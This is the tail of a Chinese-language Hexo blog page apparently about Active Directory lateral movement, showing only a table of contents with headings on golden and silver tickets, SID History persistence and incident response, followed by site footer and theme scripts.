PTT横向之黄金票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#krbtgt-hash"><span class="nav-number">3.5.1.</span> <span class="nav-text">krbtgt hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7SID"><span class="nav-number">3.5.2.</span> <span class="nav-text">获取用户SID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">3.5.3.</span> <span class="nav-text">制作黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">3.5.4.</span> <span class="nav-text">使用黄金票据横向移动</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec-PTT%E6%A8%AA%E5%90%91%E4%B9%8B%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">3.6.</span> <span class="nav-text">psexec PTT横向之白银票据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-number">4.</span> <span class="nav-text">其他利用点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SID-History-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">4.1.</span> <span class="nav-text">SID History 权限维持</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">6.</span> <span class="nav-text">应急响应</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">seconme</a>
            
        </div>
        
            <script async 
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
            <div class="deploy-info info-item">
                
                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
                
            </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>



</body>
</html>
